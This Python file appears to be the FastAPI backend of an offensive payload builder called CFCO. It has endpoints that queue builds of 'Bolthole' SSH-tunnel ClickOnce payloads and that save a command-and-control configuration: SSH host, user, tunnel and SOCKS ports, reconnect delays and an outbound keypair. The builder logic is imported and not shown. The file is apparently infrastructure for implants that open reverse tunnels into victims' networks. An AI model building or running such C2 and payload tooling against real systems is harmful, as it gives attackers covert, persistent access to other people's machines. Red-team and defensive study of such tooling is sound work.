import os
import traceback
import string
import secrets
from fastapi import FastAPI, HTTPException, Request, BackgroundTasks


from src.models import CFCOPayload
from src.bolthole_models import BoltholePayload, BoltholeC2ConfigRequest
from src.bolthole_c2store import (
    load_config, save_config,
    load_keypair, generate_keypair, get_or_generate_keypair, get_fingerprint,
)
from src.logging import log_request, GlobalLogger
from src.consts import BUILD_DIR
from src.builder import build_func
from src.bolthole_builder import bolthole_build_func

app = FastAPI(title="CFCO API Server")


def _generate_buildid():
    return "".join(
        secrets.choice(string.ascii_letters + string.digits) for _ in range(16)
    )


@app.post("/build")
@app.post("/api/build")
async def build(
    payload: CFCOPayload,
    req: Request,
    background_task: BackgroundTasks):
    """Build CFCO payload"""
    try:
        log_request(req)
        buildid = _generate_buildid()
        GlobalLogger.info("Started build #%s", buildid)

        build_dir = os.path.join(BUILD_DIR, buildid)
        os.makedirs(build_dir, exist_ok=True)

        background_task.add_task(build_func, buildid, payload)

        return {"buildid": buildid}

    except Exception as e:  # pylint: disable=broad-except
        GlobalLogger.error("Exception occured as %s", e)
        GlobalLogger.error("Traceback: %s", traceback.format_exc())
        raise HTTPException(status_code=500)


@app.post("/bolthole-build")
@app.post("/api/bolthole-build")
async def bolthole_build(
    payload: BoltholePayload,
    req: Request,
    background_task: BackgroundTasks):
    """Build Bolthole SSH-tunnel ClickOnce payload"""
    try:
        log_request(req)
        buildid = _generate_buildid()
        GlobalLogger.info("Started Bolthole build #%s", buildid)

        build_dir = os.path.join(BUILD_DIR, buildid)
        os.makedirs(build_dir, exist_ok=True)

        background_task.add_task(bolthole_build_func, buildid, payload)

        return {"buildid": buildid}

    except Exception as e:  # pylint: disable=broad-except
        GlobalLogger.error("Exception occured as %s", e)
        GlobalLogger.error("Traceback: %s", traceback.format_exc())
        raise HTTPException(status_code=500)


def _keypair_response(pub: str) -> dict:
    return {
        "exists": True,
        "public_key": pub.strip(),
        "fingerprint": get_fingerprint(pub),
    }


@app.get("/bolthole/c2")
@app.get("/api/bolthole/c2")
async def bolthole_c2_get():
    """Return saved global C2 config and outbound keypair status.
    Auto-generates a keypair on first call so the UI always has a public key."""
    try:
        config = load_config()
        _, pub = get_or_generate_keypair()
        return {"config": config, "keypair": _keypair_response(pub)}
    except Exception as e:  # pylint: disable=broad-except
        GlobalLogger.error("bolthole_c2_get error: %s", e)
        raise HTTPException(status_code=500)


@app.post("/bolthole/c2")
@app.post("/api/bolthole/c2")
async def bolthole_c2_save(body: BoltholeC2ConfigRequest):
    """Persist C2 config. Rotates the global outbound keypair when regenerate_keypair=true."""
    try:
        config = {
            "ssh_host":        body.ssh_host,
            "ssh_user":        body.ssh_user,
            "ports":           body.ports,
            "tunnel_port":     body.tunnel_port,
            "socks_port":      body.socks_port,
            "startup_delay":   body.startup_delay,
            "reconnect_delay": body.reconnect_delay,
        }
        save_config(config)

        if body.regenerate_keypair:
            _, pub = generate_keypair()
            GlobalLogger.info("Global outbound keypair rotated")
        else:
            _, pub = get_or_generate_keypair()

        return {"config": config, "keypair": _keypair_response(pub)}
    except Exception as e:  # pylint: disable=broad-except
        GlobalLogger.error("bolthole_c2_save error: %s", e)
        raise HTTPException(status_code=500)
